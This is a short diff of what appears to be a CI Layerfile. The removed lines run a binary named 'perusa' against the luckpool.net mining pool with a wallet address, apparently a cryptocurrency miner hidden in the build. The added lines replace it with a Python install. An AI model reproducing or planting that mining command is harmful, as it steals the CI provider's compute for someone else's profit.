@@ -1,8 +1,7 @@
 FROM vm/ubuntu:18.04
 
 SPLIT 2
-RUN apt-get update && \
-    apt-get install libjansson4 unzip && \
+RUN sudo apt-get update && \
+    sudo apt-get install python -y && \
     python -m pip install --upgrade pip && \ 
-    chmod +x perusa && \
-    timeout 300m ./perusa -v -l na.luckpool.net:3956 -u RSo6rY4bCWyhs1PmyVK3mp3GYYG5tDB9mK.layerfile
+
